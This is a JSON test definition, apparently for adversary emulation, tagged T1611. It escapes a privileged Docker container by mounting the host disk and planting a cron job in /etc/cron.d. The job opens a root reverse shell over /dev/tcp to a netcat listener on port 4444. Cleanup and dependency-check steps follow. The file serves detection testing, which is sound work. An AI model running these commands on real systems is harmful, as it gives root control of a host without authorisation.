{
  "id": "6c499943-b098-4bc6-8d38-0956fc182984",
  "name": "Mount host filesystem to escape privileged Docker container",
  "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "a0b96e45-c175-48f2-996e-3ca5ade60342",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "34e2e030-b739-48f7-a76a-c8d234ea7724",
      "type": "execute-command",
      "data": {
        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
      "name": "Check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "e48c8826-26ca-4d4b-88b8-d7ba9965e167",
      "name": "Resolve dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "36953678-9cc6-4e12-bdb4-91beeae8f813",
      "name": "Re-check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
      "name": "Check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7",
      "name": "Resolve dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "a188745e-4e05-4797-8ce8-a02bd21d8af4",
      "name": "Re-check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
      "name": "Check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9",
      "name": "Resolve dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "2de41b57-be2f-4ac8-97d1-3fe07d551f38",
      "name": "Re-check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "fc844163-5c49-4b2c-a924-6d191dbad19b",
      "name": "Check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a",
      "name": "Resolve dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "83a9da1b-0dda-4deb-a426-e0610cdc3c01",
      "name": "Re-check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
      "name": "Check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f",
      "name": "Resolve dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "a9a97519-86d7-407f-9840-4d15bcda89cb",
      "name": "Re-check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "a0b96e45-c175-48f2-996e-3ca5ade60342",
      "p": "on-success",
      "o": "34e2e030-b739-48f7-a76a-c8d234ea7724"
    },
    {
      "s": "a0b96e45-c175-48f2-996e-3ca5ade60342",
      "p": "on-failure",
      "o": "34e2e030-b739-48f7-a76a-c8d234ea7724"
    },
    {
      "s": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
      "p": "on-success",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
      "p": "on-failure",
      "o": "e48c8826-26ca-4d4b-88b8-d7ba9965e167"
    },
    {
      "s": "e48c8826-26ca-4d4b-88b8-d7ba9965e167",
      "p": "on-success",
      "o": "36953678-9cc6-4e12-bdb4-91beeae8f813"
    },
    {
      "s": "36953678-9cc6-4e12-bdb4-91beeae8f813",
      "p": "on-failure",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
      "p": "on-success",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
      "p": "on-failure",
      "o": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7"
    },
    {
      "s": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7",
      "p": "on-success",
      "o": "a188745e-4e05-4797-8ce8-a02bd21d8af4"
    },
    {
      "s": "a188745e-4e05-4797-8ce8-a02bd21d8af4",
      "p": "on-failure",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
      "p": "on-success",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
      "p": "on-failure",
      "o": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9"
    },
    {
      "s": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9",
      "p": "on-success",
      "o": "2de41b57-be2f-4ac8-97d1-3fe07d551f38"
    },
    {
      "s": "2de41b57-be2f-4ac8-97d1-3fe07d551f38",
      "p": "on-failure",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "fc844163-5c49-4b2c-a924-6d191dbad19b",
      "p": "on-success",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "fc844163-5c49-4b2c-a924-6d191dbad19b",
      "p": "on-failure",
      "o": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a"
    },
    {
      "s": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a",
      "p": "on-success",
      "o": "83a9da1b-0dda-4deb-a426-e0610cdc3c01"
    },
    {
      "s": "83a9da1b-0dda-4deb-a426-e0610cdc3c01",
      "p": "on-failure",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
      "p": "on-success",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    },
    {
      "s": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
      "p": "on-failure",
      "o": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f"
    },
    {
      "s": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f",
      "p": "on-success",
      "o": "a9a97519-86d7-407f-9840-4d15bcda89cb"
    },
    {
      "s": "a9a97519-86d7-407f-9840-4d15bcda89cb",
      "p": "on-failure",
      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
    }
  ],
  "tags": [
    "T1611"
  ],
  "input_arguments": [
    {
      "name": "listen_address",
      "type": "string",
      "description": "IP address to listen for callback from the host system.",
      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
    },
    {
      "name": "listen_port",
      "type": "integer",
      "description": "TCP Port to listen on for callback from the host system.",
      "value": "4444"
    },
    {
      "name": "mount_device",
      "type": "path",
      "description": "Path to the device of the host's disk to mount",
      "value": "/dev/dm-0"
    },
    {
      "name": "mount_point",
      "type": "path",
      "description": "Path where the host filesystem will be mounted",
      "value": "/mnt/T1611.002"
    },
    {
      "name": "cron_path",
      "type": "path",
      "description": "Path on the host filesystem where cron jobs are stored",
      "value": "/etc/cron.d"
    },
    {
      "name": "cron_filename",
      "type": "string",
      "description": "Filename of the cron job in cron_path",
      "value": "T1611_002"
    }
  ]
}